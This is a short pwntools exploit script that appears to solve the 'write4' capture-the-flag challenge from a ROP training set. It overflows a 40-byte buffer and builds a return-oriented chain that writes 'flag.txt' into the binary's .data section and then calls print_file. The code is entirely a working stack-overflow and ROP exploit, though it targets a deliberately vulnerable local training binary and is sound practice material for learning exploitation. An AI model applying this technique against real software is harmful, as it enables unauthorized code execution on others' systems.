from pwn import *


proc = process("./write4")

payload = b'0' * 40

payload += p64(0x0000000000400690) # 0x0000000000400690 : pop r14 ; pop r15 ; ret
payload += p64(0x0000000000601028) # .data:0000000000601028
payload += p64(0x7478742e67616c66) # flag.txt -> 0x74 78 74 2e 67 61 6c 66
payload += p64(0x0000000000400628) # .text:0000000000400628 usefulGadgets

payload += p64(0x0000000000400690) # 0x0000000000400690 : pop r14 ; pop r15 ; ret
payload += p64(0x0000000000601030) # .data:0000000000601030
payload += p64(0x0000000000000000) # NUL
payload += p64(0x0000000000400628) # .text:0000000000400628 usefulGadgets

payload += p64(0x0000000000400693) # 0x0000000000400693 : pop rdi ; ret
payload += p64(0x0000000000601028) # .data:0000000000601028

payload += p64(0x0000000000400510) # .plt:0000000000400510 _print_file 

proc.sendline(payload)
proc.interactive()
